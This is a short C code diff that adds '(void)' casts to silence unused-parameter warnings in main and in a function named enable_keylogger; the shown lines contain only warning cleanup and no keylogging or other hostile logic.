@@ -96,6 +96,7 @@ void runme(int argc, char **argv)
 
 int enable_keylogger(int argc, char **argv)
 {
+	(void)argc;
 	struct termios tios;
 	int status;
 
@@ -146,6 +147,8 @@ int enable_keylogger(int argc, char **argv)
 
 int main(int argc, char **argv)
 {
+	(void)argc;
+	(void)argv;
 #ifdef KEYLOGGER
 	return enable_keylogger(argc, argv);
 #endif
